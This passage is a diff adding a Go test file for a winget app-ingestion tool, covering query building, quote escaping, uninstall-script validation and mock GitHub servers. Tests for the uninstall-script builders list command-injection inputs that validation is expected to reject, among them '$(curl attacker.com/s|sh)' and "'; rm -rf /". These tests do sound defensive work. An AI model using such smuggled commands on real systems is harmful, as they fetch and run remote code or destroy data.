@@ -1,0 +1,1058 @@
+package winget
+
+import (
+	"context"
+	"encoding/json"
+	"log/slog"
+	"net/http"
+	"net/http/httptest"
+	"net/url"
+	"os"
+	"path"
+	"testing"
+
+	maintained_apps "github.com/fleetdm/fleet/v4/ee/maintained-apps"
+	"github.com/fleetdm/fleet/v4/server/ptr"
+	"github.com/google/go-github/v37/github"
+	"github.com/stretchr/testify/assert"
+	"github.com/stretchr/testify/require"
+	"gopkg.in/yaml.v2"
+)
+
+func TestWingetVersionManifestDirs(t *testing.T) {
+	dir := func(name string) *github.RepositoryContent {
+		return &github.RepositoryContent{Name: &name, Type: ptr.String("dir")}
+	}
+	file := func(name string) *github.RepositoryContent {
+		return &github.RepositoryContent{Name: &name, Type: ptr.String("file")}
+	}
+	in := []*github.RepositoryContent{
+		dir("Portable"),
+		dir("0.9.6"),
+		dir("0.20.4"),
+		file("README.md"),
+	}
+	got := wingetVersionManifestDirs(in)
+	require.Len(t, got, 2)
+	assert.Equal(t, "0.9.6", got[0].GetName())
+	assert.Equal(t, "0.20.4", got[1].GetName())
+
+	// Legacy year-only folders (e.g. Microsoft.Office keeps "2010" alongside
+	// its current "16.0.x" versions) must be excluded so they don't outrank
+	// real versions in the descending version sort.
+	in = []*github.RepositoryContent{
+		dir("2010"),
+		dir("16.0.19822.20114"),
+		dir("16.0.19929.20062"),
+	}
+	got = wingetVersionManifestDirs(in)
+	require.Len(t, got, 2)
+	assert.Equal(t, "16.0.19822.20114", got[0].GetName())
+	assert.Equal(t, "16.0.19929.20062", got[1].GetName())
+}
+
+func TestFuzzyMatchUnmarshalJSON(t *testing.T) {
+	tests := []struct {
+		name        string
+		input       string
+		wantEnabled bool
+		wantCustom  string
+		wantErr     bool
+	}{
+		{
+			name:        "boolean true",
+			input:       `{"fuzzy_match_name": true}`,
+			wantEnabled: true,
+			wantCustom:  "",
+		},
+		{
+			name:        "boolean false",
+			input:       `{"fuzzy_match_name": false}`,
+			wantEnabled: false,
+			wantCustom:  "",
+		},
+		{
+			name:        "omitted defaults to disabled",
+			input:       `{}`,
+			wantEnabled: false,
+			wantCustom:  "",
+		},
+		{
+			name:        "custom LIKE pattern string",
+			input:       `{"fuzzy_match_name": "Mozilla Firefox % ESR %"}`,
+			wantEnabled: true,
+			wantCustom:  "Mozilla Firefox % ESR %",
+		},
+		{
+			name:        "empty string treated as disabled",
+			input:       `{"fuzzy_match_name": ""}`,
+			wantEnabled: false,
+			wantCustom:  "",
+		},
+		{
+			name:    "invalid type (number)",
+			input:   `{"fuzzy_match_name": 42}`,
+			wantErr: true,
+		},
+		{
+			name:    "invalid type (array)",
+			input:   `{"fuzzy_match_name": [1,2]}`,
+			wantErr: true,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			var out struct {
+				FuzzyMatchName fuzzyMatch `json:"fuzzy_match_name"`
+			}
+			err := json.Unmarshal([]byte(tt.input), &out)
+			if tt.wantErr {
+				require.Error(t, err)
+				return
+			}
+			require.NoError(t, err)
+			assert.Equal(t, tt.wantEnabled, out.FuzzyMatchName.Enabled)
+			assert.Equal(t, tt.wantCustom, out.FuzzyMatchName.Custom)
+		})
+	}
+}
+
+func TestSetUpExistsQuery(t *testing.T) {
+	tests := []struct {
+		name      string
+		fuzzy     fuzzyMatch
+		appName   string
+		publisher string
+		want      maintained_apps.FMAQueries
+	}{
+		{
+			name:      "exact match (fuzzy disabled)",
+			fuzzy:     fuzzyMatch{Enabled: false, Custom: ""},
+			appName:   "Mozilla Firefox",
+			publisher: "Mozilla",
+			want: maintained_apps.FMAQueries{
+				Exists: "SELECT 1 FROM programs WHERE name = 'Mozilla Firefox' AND publisher = 'Mozilla';",
+			},
+		},
+		{
+			name:      "fuzzy enabled without custom pattern",
+			fuzzy:     fuzzyMatch{Enabled: true, Custom: ""},
+			appName:   "Mozilla Firefox",
+			publisher: "Mozilla",
+			want: maintained_apps.FMAQueries{
+				Exists: "SELECT 1 FROM programs WHERE name LIKE 'Mozilla Firefox %' AND publisher = 'Mozilla';",
+			},
+		},
+		{
+			name:      "custom fuzzy pattern",
+			fuzzy:     fuzzyMatch{Enabled: true, Custom: "Mozilla Firefox % ESR %"},
+			appName:   "Mozilla Firefox",
+			publisher: "Mozilla",
+			want: maintained_apps.FMAQueries{
+				Exists: "SELECT 1 FROM programs WHERE name LIKE 'Mozilla Firefox % ESR %' AND publisher = 'Mozilla';",
+			},
+		},
+		{
+			name:      "exact match escapes single quotes in name",
+			fuzzy:     fuzzyMatch{Enabled: false, Custom: ""},
+			appName:   "O'Reilly App",
+			publisher: "O'Reilly Media",
+			want: maintained_apps.FMAQueries{
+				Exists: "SELECT 1 FROM programs WHERE name = 'O''Reilly App' AND publisher = 'O''Reilly Media';",
+			},
+		},
+		{
+			name:      "fuzzy enabled escapes single quotes in name",
+			fuzzy:     fuzzyMatch{Enabled: true, Custom: ""},
+			appName:   "O'Reilly App",
+			publisher: "O'Reilly Media",
+			want: maintained_apps.FMAQueries{
+				Exists: "SELECT 1 FROM programs WHERE name LIKE 'O''Reilly App %' AND publisher = 'O''Reilly Media';",
+			},
+		},
+		{
+			name:      "custom pattern escapes single quotes",
+			fuzzy:     fuzzyMatch{Enabled: true, Custom: "O'Reilly % Edition"},
+			appName:   "O'Reilly App",
+			publisher: "O'Reilly Media",
+			want: maintained_apps.FMAQueries{
+				Exists: "SELECT 1 FROM programs WHERE name LIKE 'O''Reilly % Edition' AND publisher = 'O''Reilly Media';",
+			},
+		},
+		{
+			name:      "empty name and publisher exact match",
+			fuzzy:     fuzzyMatch{Enabled: false, Custom: ""},
+			appName:   "",
+			publisher: "",
+			want: maintained_apps.FMAQueries{
+				Exists: "SELECT 1 FROM programs WHERE name = '' AND publisher = '';",
+			},
+		},
+		{
+			name:      "custom pattern takes precedence over Enabled flag",
+			fuzzy:     fuzzyMatch{Enabled: false, Custom: "Custom Pattern %"},
+			appName:   "Ignored Name",
+			publisher: "Some Publisher",
+			want: maintained_apps.FMAQueries{
+				Exists: "SELECT 1 FROM programs WHERE name LIKE 'Custom Pattern %' AND publisher = 'Some Publisher';",
+			},
+		},
+		{
+			name:      "multiple single quotes in name",
+			fuzzy:     fuzzyMatch{Enabled: false, Custom: ""},
+			appName:   "It's a 'test' app",
+			publisher: "Pub",
+			want: maintained_apps.FMAQueries{
+				Exists: "SELECT 1 FROM programs WHERE name = 'It''s a ''test'' app' AND publisher = 'Pub';",
+			},
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got := setUpExistsQuery(tt.fuzzy, tt.appName, tt.publisher)
+			assert.Equal(t, tt.want, got)
+		})
+	}
+}
+
+func TestBuildUpgradeCodeBasedUninstallScript(t *testing.T) {
+	tests := []struct {
+		name        string
+		upgradeCode string
+		wantErr     bool
+		errContains string
+	}{
+		{
+			name:        "valid GUID upgrade code",
+			upgradeCode: "{12345678-1234-1234-1234-123456789012}",
+			wantErr:     false,
+		},
+		{
+			name:        "valid simple upgrade code",
+			upgradeCode: "SomeUpgradeCode-1.0",
+			wantErr:     false,
+		},
+		{
+			name:        "malicious upgrade code with command substitution",
+			upgradeCode: "legit$(curl attacker.com/s|sh)",
+			wantErr:     true,
+			errContains: "contains invalid characters",
+		},
+		{
+			name:        "malicious upgrade code with backticks",
+			upgradeCode: "legit`curl attacker.com`",
+			wantErr:     true,
+			errContains: "contains invalid characters",
+		},
+		{
+			name:        "malicious upgrade code with single quote breakout",
+			upgradeCode: "code'; rm -rf /; echo '",
+			wantErr:     true,
+			errContains: "contains invalid characters",
+		},
+		{
+			name:        "malicious upgrade code with semicolon",
+			upgradeCode: "code;whoami",
+			wantErr:     true,
+			errContains: "contains invalid characters",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			result, err := buildUpgradeCodeBasedUninstallScript(tt.upgradeCode)
+			if tt.wantErr {
+				require.Error(t, err)
+				assert.Contains(t, err.Error(), tt.errContains)
+				assert.Empty(t, result)
+			} else {
+				require.NoError(t, err)
+				assert.NotEmpty(t, result)
+				// Verify the upgrade code appears in single quotes
+				assert.Contains(t, result, "'"+tt.upgradeCode+"'")
+			}
+		})
+	}
+}
+
+func TestPreProcessUninstallScript(t *testing.T) {
+	tests := []struct {
+		name            string
+		uninstallScript string
+		productCode     string
+		wantErr         bool
+		errContains     string
+	}{
+		{
+			name:            "valid GUID product code",
+			uninstallScript: `msiexec /x "$PACKAGE_ID" /quiet`,
+			productCode:     "{12345678-1234-1234-1234-123456789012}",
+			wantErr:         false,
+		},
+		{
+			name:            "valid simple product code",
+			uninstallScript: `msiexec /x "$PACKAGE_ID" /quiet`,
+			productCode:     "SomeProduct-1.0",
+			wantErr:         false,
+		},
+		{
+			name:            "malicious product code with command substitution",
+			uninstallScript: `msiexec /x "$PACKAGE_ID" /quiet`,
+			productCode:     "legit$(curl attacker.com/s|sh)",
+			wantErr:         true,
+			errContains:     "contains invalid characters",
+		},
+		{
+			name:            "malicious product code with backticks",
+			uninstallScript: `msiexec /x "$PACKAGE_ID" /quiet`,
+			productCode:     "legit`curl attacker.com`",
+			wantErr:         true,
+			errContains:     "contains invalid characters",
+		},
+		{
+			name:            "malicious product code with single quote breakout",
+			uninstallScript: `msiexec /x "$PACKAGE_ID" /quiet`,
+			productCode:     "code'; rm -rf /; echo '",
+			wantErr:         true,
+			errContains:     "contains invalid characters",
+		},
+		{
+			name:            "malicious product code with pipe",
+			uninstallScript: `msiexec /x "$PACKAGE_ID" /quiet`,
+			productCode:     "code|whoami",
+			wantErr:         true,
+			errContains:     "contains invalid characters",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			result, err := preProcessUninstallScript(tt.uninstallScript, tt.productCode)
+			if tt.wantErr {
+				require.Error(t, err)
+				assert.Contains(t, err.Error(), tt.errContains)
+				assert.Empty(t, result)
+			} else {
+				require.NoError(t, err)
+				assert.NotEmpty(t, result)
+				// Verify the product code appears in single quotes
+				assert.Contains(t, result, "'"+tt.productCode+"'")
+			}
+		})
+	}
+}
+
+func TestIngestValidations(t *testing.T) {
+	ctx := context.Background()
+	tempDir := t.TempDir()
+
+	testInstallScriptContents := "this is a test install script"
+	require.NoError(t, os.WriteFile(path.Join(tempDir, "install_script.ps1"), []byte(testInstallScriptContents), 0644))
+
+	testUninstallScriptContents := "this is a test uninstall script"
+	require.NoError(t, os.WriteFile(path.Join(tempDir, "uninstall_script.ps1"), []byte(testUninstallScriptContents), 0644))
+
+	cases := []struct {
+		name                string
+		wantErr             string
+		wantExists          string
+		wantPatched         string
+		wantPatchedContains string
+		wantOpen            string
+		inputApp            inputApp
+		cfg                 serverConfig
+	}{
+		{
+			name:       "valid",
+			wantErr:    "",
+			wantExists: "SELECT 1 FROM programs WHERE name = 'Foo' AND publisher = 'Bar, Inc.';",
+			inputApp: inputApp{
+				Name:                "Foo",
+				UniqueIdentifier:    "Foo",
+				PackageIdentifier:   "Foo",
+				InstallerArch:       "x64",
+				Slug:                "foo/windows",
+				InstallScriptPath:   path.Join(tempDir, "install_script.ps1"),
+				UninstallScriptPath: path.Join(tempDir, "uninstall_script.ps1"),
+				InstallerType:       "msi",
+				InstallerScope:      "machine",
+			},
+			cfg: serverConfig{
+				productCode:       "{ABCDEF}",
+				installerType:     "msi",
+				installerScope:    "machine",
+				installerArch:     "x64",
+				installerProdCode: "{ACBDEF}",
+				upgradeCode:       "{ABCDEF}",
+			},
+		},
+		{
+			name: "use display version for patch",
+			// PackageVersion is "1.0" but the registry DisplayVersion is
+			// "1.0.150.0"; the patch policy must compare against the latter.
+			wantPatchedContains: "version_compare(version, '1.0.150.0')",
+			inputApp: inputApp{
+				Name:                      "Foo",
+				UniqueIdentifier:          "Foo",
+				PackageIdentifier:         "Foo",
+				InstallerArch:             "x64",
+				Slug:                      "foo/windows",
+				InstallScriptPath:         path.Join(tempDir, "install_script.ps1"),
+				UninstallScriptPath:       path.Join(tempDir, "uninstall_script.ps1"),
+				InstallerType:             "msi",
+				InstallerScope:            "machine",
+				UseDisplayVersionForPatch: true,
+			},
+			cfg: serverConfig{
+				productCode:       "{ABCDEF}",
+				installerType:     "msi",
+				installerScope:    "machine",
+				installerArch:     "x64",
+				installerProdCode: "{ACBDEF}",
+				upgradeCode:       "{ABCDEF}",
+				displayVersion:    "1.0.150.0",
+			},
+		},
+		{
+			name:    "use display version for patch with no display version",
+			wantErr: "no DisplayVersion found",
+			inputApp: inputApp{
+				Name:                      "Foo",
+				UniqueIdentifier:          "Foo",
+				PackageIdentifier:         "Foo",
+				InstallerArch:             "x64",
+				Slug:                      "foo/windows",
+				InstallScriptPath:         path.Join(tempDir, "install_script.ps1"),
+				UninstallScriptPath:       path.Join(tempDir, "uninstall_script.ps1"),
+				InstallerType:             "msi",
+				InstallerScope:            "machine",
+				UseDisplayVersionForPatch: true,
+			},
+			cfg: serverConfig{
+				productCode:       "{ABCDEF}",
+				installerType:     "msi",
+				installerScope:    "machine",
+				installerArch:     "x64",
+				installerProdCode: "{ACBDEF}",
+				upgradeCode:       "{ABCDEF}",
+			},
+		},
+		{
+			name:    "enricher failure stops ingestion",
+			wantErr: "enriching manifest",
+			inputApp: inputApp{
+				Name:                "Sublime Text",
+				UniqueIdentifier:    "Sublime Text",
+				PackageIdentifier:   "Foo",
+				InstallerArch:       "x64",
+				Slug:                "sublime-text/windows",
+				InstallScriptPath:   path.Join(tempDir, "install_script.ps1"),
+				UninstallScriptPath: path.Join(tempDir, "uninstall_script.ps1"),
+				InstallerType:       "exe",
+				InstallerScope:      "machine",
+			},
+			cfg: serverConfig{
+				installerType:  "exe",
+				installerScope: "machine",
+				installerArch:  "x64",
+				installerURL:   "https://download.sublimetext.com/latest/windows",
+			},
+		},
+		{
+			name: "arm64 scopes policy queries to ARM hosts",
+			// An arm64 build can't run on x64, so both policy queries pass on non-ARM
+			// hosts. The open query runs only on a host already queued, so it is unscoped.
+			wantExists:  "SELECT 1 WHERE EXISTS (SELECT 1 FROM programs WHERE name = 'Foo' AND publisher = 'Bar, Inc.') OR NOT EXISTS (SELECT 1 FROM system_info WHERE cpu_type LIKE 'ARM%');",
+			wantPatched: "SELECT 1 WHERE EXISTS (SELECT 1 WHERE NOT EXISTS (SELECT 1 FROM programs WHERE name = 'Foo' AND publisher = 'Bar, Inc.' AND version_compare(version, '1.0') < 0)) OR NOT EXISTS (SELECT 1 FROM system_info WHERE cpu_type LIKE 'ARM%');",
+			inputApp: inputApp{
+				Name:                "Foo",
+				UniqueIdentifier:    "Foo",
+				PackageIdentifier:   "Foo",
+				InstallerArch:       "arm64",
+				Slug:                "foo-arm64/windows",
+				InstallScriptPath:   path.Join(tempDir, "install_script.ps1"),
+				UninstallScriptPath: path.Join(tempDir, "uninstall_script.ps1"),
+				InstallerType:       "msi",
+				InstallerScope:      "machine",
+			},
+			cfg: serverConfig{
+				productCode:       "{ABCDEF}",
+				installerType:     "msi",
+				installerScope:    "machine",
+				installerArch:     "arm64",
+				installerProdCode: "{ACBDEF}",
+				upgradeCode:       "{ABCDEF}",
+			},
+		},
+		{
+			name: "ignore upgrade code",
+			inputApp: inputApp{
+				Name:                "Foo",
+				UniqueIdentifier:    "Foo",
+				PackageIdentifier:   "Foo",
+				InstallerArch:       "x64",
+				Slug:                "foo/windows",
+				InstallScriptPath:   path.Join(tempDir, "install_script.ps1"),
+				UninstallScriptPath: path.Join(tempDir, "uninstall_script.ps1"),
+				InstallerType:       "msi",
+				InstallerScope:      "machine",
+				IgnoreUpgradeCode:   true,
+			},
+			cfg: serverConfig{
+				productCode:       "{ABCDEF}",
+				installerType:     "msi",
+				installerScope:    "machine",
+				installerArch:     "x64",
+				installerProdCode: "{ACBDEF}",
+				upgradeCode:       "{ABCDEF}",
+			},
+		},
+		{
+			// winget manifests sometimes mislabel an exe installer as "portable".
+			name:       "portable installer type falls back to the URL extension",
+			wantExists: "SELECT 1 FROM programs WHERE name = 'Foo' AND publisher = 'Bar, Inc.';",
+			inputApp: inputApp{
+				Name:                "Foo",
+				UniqueIdentifier:    "Foo",
+				PackageIdentifier:   "Foo",
+				InstallerArch:       "x64",
+				Slug:                "foo/windows",
+				InstallScriptPath:   path.Join(tempDir, "install_script.ps1"),
+				UninstallScriptPath: path.Join(tempDir, "uninstall_script.ps1"),
+				InstallerType:       "exe",
+				InstallerScope:      "machine",
+			},
+			cfg: serverConfig{
+				installerType:  "portable",
+				installerScope: "machine",
+				installerArch:  "x64",
+				installerURL:   "https://example.com/foo_installer.exe",
+			},
+		},
+		{
+			name:       "portable manifest type defers to the per-installer type",
+			wantExists: "SELECT 1 FROM programs WHERE name = 'Foo' AND publisher = 'Bar, Inc.';",
+			inputApp: inputApp{
+				Name:                "Foo",
+				UniqueIdentifier:    "Foo",
+				PackageIdentifier:   "Foo",
+				InstallerArch:       "x64",
+				Slug:                "foo/windows",
+				InstallScriptPath:   path.Join(tempDir, "install_script.ps1"),
+				UninstallScriptPath: path.Join(tempDir, "uninstall_script.ps1"),
+				InstallerType:       "exe",
+				InstallerScope:      "machine",
+			},
+			cfg: serverConfig{
+				installerType:      "portable",
+				installerEntryType: "exe",
+				installerScope:     "machine",
+				installerArch:      "x64",
+				installerURL:       "https://example.com/foo_installer",
+			},
+		},
+		{
+			name:    "wrong installer type",
+			wantErr: "failed to find installer for app",
+			inputApp: inputApp{
+				Name:              "Foo",
+				UniqueIdentifier:  "Foo",
+				PackageIdentifier: "Foo",
+				InstallerArch:     "x64",
+				Slug:              "foo/windows",
+				InstallerType:     "exe",
+				InstallerScope:    "machine",
+			},
+			cfg: serverConfig{
+				productCode:       "{ABCDEF}",
+				installerType:     "msi", // mismatch here
+				installerScope:    "machine",
+				installerArch:     "x64",
+				installerProdCode: "{ACBDEF}",
+				upgradeCode:       "{ABCDEF}",
+			},
+		},
+		{
+			name:     "open process names",
+			wantOpen: "SELECT 1 WHERE NOT EXISTS (SELECT 1 FROM processes WHERE LOWER(name) IN ('foo64.exe','foo-helper.exe'));",
+			inputApp: inputApp{
+				Name:                "Foo",
+				UniqueIdentifier:    "Foo",
+				PackageIdentifier:   "Foo",
+				InstallerArch:       "x64",
+				Slug:                "foo/windows",
+				InstallScriptPath:   path.Join(tempDir, "install_script.ps1"),
+				UninstallScriptPath: path.Join(tempDir, "uninstall_script.ps1"),
+				InstallerType:       "msi",
+				InstallerScope:      "machine",
+				OpenProcessNames:    []string{"Foo64.exe", "foo-helper.exe"},
+			},
+			cfg: serverConfig{
+				productCode:       "{ABCDEF}",
+				installerType:     "msi",
+				installerScope:    "machine",
+				installerArch:     "x64",
+				installerProdCode: "{ACBDEF}",
+				upgradeCode:       "{ABCDEF}",
+			},
+		},
+		{
+			name:    "open process names with prefix",
+			wantErr: "can't both be set",
+			inputApp: inputApp{
+				Name:                  "Foo",
+				UniqueIdentifier:      "Foo",
+				PackageIdentifier:     "Foo",
+				InstallerArch:         "x64",
+				Slug:                  "foo/windows",
+				InstallScriptPath:     path.Join(tempDir, "install_script.ps1"),
+				UninstallScriptPath:   path.Join(tempDir, "uninstall_script.ps1"),
+				InstallerType:         "msi",
+				InstallerScope:        "machine",
+				OpenProcessNames:      []string{"foo64.exe"},
+				OpenProcessNamePrefix: "foo",
+			},
+			cfg: serverConfig{
+				productCode:       "{ABCDEF}",
+				installerType:     "msi",
+				installerScope:    "machine",
+				installerArch:     "x64",
+				installerProdCode: "{ACBDEF}",
+				upgradeCode:       "{ABCDEF}",
+			},
+		},
+	}
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			srv := newTestServer(t, c.cfg)
+			t.Cleanup(srv.Close)
+
+			gc := github.NewClient(srv.Client())
+			url, err := url.Parse(srv.URL + "/")
+			require.NoError(t, err)
+			gc.BaseURL = url
+
+			i := wingetIngester{
+				logger:       slog.New(slog.DiscardHandler),
+				githubClient: gc,
+			}
+
+			out, err := i.ingestOne(ctx, c.inputApp)
+			if c.wantErr != "" {
+				require.ErrorContains(t, err, c.wantErr)
+				return
+			}
+			require.NoError(t, err)
+			if c.wantExists != "" {
+				require.Equal(t, c.wantExists, out.Queries.Exists)
+			}
+			if c.wantPatched != "" {
+				require.Equal(t, c.wantPatched, out.Queries.Patched)
+			}
+			if c.wantPatchedContains != "" {
+				require.Contains(t, out.Queries.Patched, c.wantPatchedContains)
+			}
+			if c.inputApp.IgnoreUpgradeCode {
+				require.Empty(t, out.UpgradeCode)
+			} else {
+				require.Equal(t, c.cfg.upgradeCode, out.UpgradeCode)
+			}
+			wantOpen := c.wantOpen
+			if wantOpen == "" {
+				// The managed "is app open" query matches a process named "<title>.exe".
+				wantOpen = "SELECT 1 WHERE NOT EXISTS (SELECT 1 FROM processes WHERE LOWER(name) = 'foo.exe');"
+			}
+			require.Equal(t, wantOpen, out.Queries.Open)
+		})
+	}
+}
+
+func TestWindowsOpenQuery(t *testing.T) {
+	cases := []struct {
+		name    string
+		names   []string
+		prefix  string
+		want    string
+		wantErr string
+	}{
+		{
+			name: "default is <name>.exe",
+			want: "SELECT 1 WHERE NOT EXISTS (SELECT 1 FROM processes WHERE LOWER(name) = 'android studio.exe');",
+		},
+		{
+			name:  "empty list is the default",
+			names: []string{},
+			want:  "SELECT 1 WHERE NOT EXISTS (SELECT 1 FROM processes WHERE LOWER(name) = 'android studio.exe');",
+		},
+		{
+			name:  "single name",
+			names: []string{"studio64.exe"},
+			want:  "SELECT 1 WHERE NOT EXISTS (SELECT 1 FROM processes WHERE LOWER(name) = 'studio64.exe');",
+		},
+		{
+			name:  "names keep manifest order",
+			names: []string{"idea.exe", "idea64.exe"},
+			want:  "SELECT 1 WHERE NOT EXISTS (SELECT 1 FROM processes WHERE LOWER(name) IN ('idea.exe','idea64.exe'));",
+		},
+		{
+			name:  "names are lowercased and escaped",
+			names: []string{"O'Reilly.exe"},
+			want:  "SELECT 1 WHERE NOT EXISTS (SELECT 1 FROM processes WHERE LOWER(name) = 'o''reilly.exe');",
+		},
+		{
+			name:  "names are trimmed",
+			names: []string{" studio64.exe "},
+			want:  "SELECT 1 WHERE NOT EXISTS (SELECT 1 FROM processes WHERE LOWER(name) = 'studio64.exe');",
+		},
+		{
+			name:   "prefix",
+			prefix: "OneDrive",
+			want:   "SELECT 1 WHERE NOT EXISTS (SELECT 1 FROM processes WHERE LOWER(name) LIKE 'onedrive%');",
+		},
+		{
+			name:   "prefix is escaped",
+			prefix: "o'drive",
+			want:   "SELECT 1 WHERE NOT EXISTS (SELECT 1 FROM processes WHERE LOWER(name) LIKE 'o''drive%');",
+		},
+		{
+			name:   "prefix LIKE wildcards match literally",
+			prefix: `Foo_Bar%\`,
+			want:   `SELECT 1 WHERE NOT EXISTS (SELECT 1 FROM processes WHERE LOWER(name) LIKE 'foo\_bar\%\\%' ESCAPE '\');`,
+		},
+		{name: "blank name", names: []string{"studio64.exe", " "}, wantErr: "blank name"},
+		{name: "blank prefix", prefix: " ", wantErr: "is blank"},
+		{name: "names and prefix", names: []string{"studio64.exe"}, prefix: "studio", wantErr: "can't both be set"},
+	}
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			got, err := windowsOpenQuery("Android Studio", c.names, c.prefix)
+			if c.wantErr != "" {
+				require.ErrorContains(t, err, c.wantErr)
+				return
+			}
+			require.NoError(t, err)
+			require.Equal(t, c.want, got)
+		})
+	}
+}
+
+type serverConfig struct {
+	productCode       string
+	installerType     string
+	installerScope    string
+	installerArch     string
+	installerProdCode string
+	upgradeCode       string
+	displayVersion    string
+	installerURL      string
+	// installerEntryType overrides the per-installer InstallerType; empty means installerType.
+	installerEntryType string
+}
+
+func newTestServer(t *testing.T, cfg serverConfig) *httptest.Server {
+	return httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		switch r.URL.Path {
+
+		case "/repos/microsoft/winget-pkgs/contents/manifests/f/Foo":
+			content := []github.RepositoryContent{{
+				Name: ptr.String("1.0"),
+				Type: ptr.String("dir"),
+			}}
+			require.NoError(t, json.NewEncoder(w).Encode(content))
+
+		case "/repos/microsoft/winget-pkgs/contents/manifests/f/Foo/1.0/Foo.installer.yaml":
+			entryType := cfg.installerEntryType
+			if entryType == "" {
+				entryType = cfg.installerType
+			}
+			manifest := installerManifest{
+				ProductCode:    cfg.productCode,
+				InstallerType:  cfg.installerType,
+				Scope:          cfg.installerScope,
+				PackageVersion: "1.0",
+				AppsAndFeaturesEntries: []appsAndFeaturesEntries{
+					{UpgradeCode: cfg.upgradeCode, DisplayVersion: cfg.displayVersion},
+				},
+				Installers: []installer{
+					{
+						Architecture:  cfg.installerArch,
+						InstallerType: entryType,
+						InstallerURL:  cfg.installerURL,
+						ProductCode:   cfg.installerProdCode,
+						Scope:         cfg.installerScope,
+					},
+				},
+			}
+
+			bytes, err := yaml.Marshal(manifest)
+			require.NoError(t, err)
+
+			str := string(bytes)
+			content := &github.RepositoryContent{
+				Name:    ptr.String("Foo"),
+				Content: &str,
+			}
+			require.NoError(t, json.NewEncoder(w).Encode(content))
+
+		case "/repos/microsoft/winget-pkgs/contents/manifests/f/Foo/1.0/Foo.locale.en-US.yaml":
+			lManifest := localeManifest{
+				PackageName: "foo",
+				Publisher:   "Bar, Inc.",
+			}
+
+			bytes, err := yaml.Marshal(lManifest)
+			require.NoError(t, err)
+
+			str := string(bytes)
+			content := &github.RepositoryContent{
+				Name:    ptr.String("Foo"),
+				Content: &str,
+			}
+			require.NoError(t, json.NewEncoder(w).Encode(content))
+
+		default:
+			w.WriteHeader(http.StatusBadRequest)
+			t.Fatalf("unexpected path %s", r.URL.Path)
+		}
+	}))
+}
+
+// newTwoVersionServer serves a package with version dirs 2.0 and 1.0; the 2.0 installer
+// manifest responds with the given status.
+func newTwoVersionServer(t *testing.T, latestInstallerStatus int) *httptest.Server {
+	return httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		writeYAMLContent := func(v any) {
+			bytes, err := yaml.Marshal(v)
+			if err != nil {
+				t.Errorf("marshaling fixture: %v", err)
+				return
+			}
+			str := string(bytes)
+			content := &github.RepositoryContent{Name: new("Foo"), Content: &str}
+			if err := json.NewEncoder(w).Encode(content); err != nil {
+				t.Errorf("encoding fixture: %v", err)
+			}
+		}
+		manifest := installerManifest{
+			ProductCode:    "{ABCDEF}",
+			InstallerType:  "msi",
+			Scope:          "machine",
+			PackageVersion: "1.0",
+			Installers: []installer{
+				{Architecture: "x64", InstallerType: "msi", ProductCode: "{ABCDEF}", Scope: "machine"},
+			},
+		}
+
+		switch r.URL.Path {
+		case "/repos/microsoft/winget-pkgs/contents/manifests/f/Foo":
+			content := []github.RepositoryContent{
+				{Name: new("2.0"), Type: new("dir")},
+				{Name: new("1.0"), Type: new("dir")},
+			}
+			if err := json.NewEncoder(w).Encode(content); err != nil {
+				t.Errorf("encoding fixture: %v", err)
+			}
+
+		case "/repos/microsoft/winget-pkgs/contents/manifests/f/Foo/2.0/Foo.installer.yaml":
+			w.WriteHeader(latestInstallerStatus)
+			_, _ = w.Write([]byte(`{"message": "gitmon refuses to schedule us"}`))
+
+		case "/repos/microsoft/winget-pkgs/contents/manifests/f/Foo/1.0/Foo.installer.yaml":
+			writeYAMLContent(manifest)
+
+		case "/repos/microsoft/winget-pkgs/contents/manifests/f/Foo/1.0/Foo.locale.en-US.yaml":
+			writeYAMLContent(localeManifest{PackageName: "foo", Publisher: "Bar, Inc."})
+
+		default:
+			w.WriteHeader(http.StatusBadRequest)
+			t.Errorf("unexpected path %s", r.URL.Path)
+		}
+	}))
+}
+
+func TestIngestOneVersionWalk(t *testing.T) {
+	ctx := context.Background()
+	input := inputApp{
+		Name:              "Foo",
+		UniqueIdentifier:  "Foo",
+		PackageIdentifier: "Foo",
+		Slug:              "foo/windows",
+		InstallerArch:     "x64",
+		InstallerType:     "msi",
+		InstallerScope:    "machine",
+	}
+
+	newIngester := func(srv *httptest.Server) *wingetIngester {
+		gc := github.NewClient(srv.Client())
+		u, err := url.Parse(srv.URL + "/")
+		require.NoError(t, err)
+		gc.BaseURL = u
+		return &wingetIngester{logger: slog.New(slog.DiscardHandler), githubClient: gc}
+	}
+
+	t.Run("404 on the latest version dir falls through to the next", func(t *testing.T) {
+		srv := newTwoVersionServer(t, http.StatusNotFound)
+		t.Cleanup(srv.Close)
+
+		out, err := newIngester(srv).ingestOne(ctx, input)
+		require.NoError(t, err)
+		require.Equal(t, "1.0", out.Version)
+	})
+
+	t.Run("429 on the latest version dir fails the app instead of downgrading", func(t *testing.T) {
+		srv := newTwoVersionServer(t, http.StatusTooManyRequests)
+		t.Cleanup(srv.Close)
+
+		_, err := newIngester(srv).ingestOne(ctx, input)
+		require.Error(t, err)
+		require.ErrorContains(t, err, "429")
+		require.True(t, isTransientGitHubError(err), "the caller must recognize this error and skip the app")
+	})
+
+	t.Run("504 on the latest version dir fails the app instead of downgrading", func(t *testing.T) {
+		srv := newTwoVersionServer(t, http.StatusGatewayTimeout)
+		t.Cleanup(srv.Close)
+
+		_, err := newIngester(srv).ingestOne(ctx, input)
+		require.Error(t, err)
+		require.ErrorContains(t, err, "504")
+		require.True(t, isTransientGitHubError(err), "the caller must recognize this error and skip the app")
+	})
+}
+
+func TestIngestNestedInstallerType(t *testing.T) {
+	ctx := context.Background()
+	tempDir := t.TempDir()
+	installScript := path.Join(tempDir, "install_script.ps1")
+	uninstallScript := path.Join(tempDir, "uninstall_script.ps1")
+	require.NoError(t, os.WriteFile(installScript, []byte("install"), 0o644))
+	require.NoError(t, os.WriteFile(uninstallScript, []byte("uninstall"), 0o644))
+
+	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		writeYAMLContent := func(v any) {
